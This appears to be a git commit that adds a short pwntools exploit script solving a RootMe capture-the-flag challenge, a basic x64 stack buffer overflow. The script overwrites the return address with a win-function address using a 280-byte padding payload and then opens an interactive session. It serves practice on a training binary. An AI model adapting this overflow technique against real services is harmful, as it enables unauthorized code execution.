fe652775603ea9b08839cc422c799610e6e97ffb
/x90Slide <kushjasrapuria03@gmail.com>
2025-01-09 17:37:49 +0530

    Create solve.py

---
+++ Pwn/RootMe/ELF x64 - Stack buffer overflow - basic/solve.py
@@ -0,0 +1,37 @@
+#!/usr/bin/env python3
+
+from pwn import *
+
+elf = ELF("./chall_patched")
+
+gs = '''
+init-pwndbg
+continue
+'''
+
+context.binary = elf
+
+def conn():
+    if args.GDB:
+        return gdb.debug([elf.path], gdbscript=gs)
+    elif args.LOCAL:
+        return process([elf.path])
+    else:
+        return remote("addr", 1337)
+
+io = conn()
+
+def main():
+
+    # good luck pwning :)
+
+    #gdb.attach(io, gdbscript=gs)
+
+    winfun = 0x401196
+    payload = flat(b'A'*280, winfun)
+    io.send(payload)
+
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
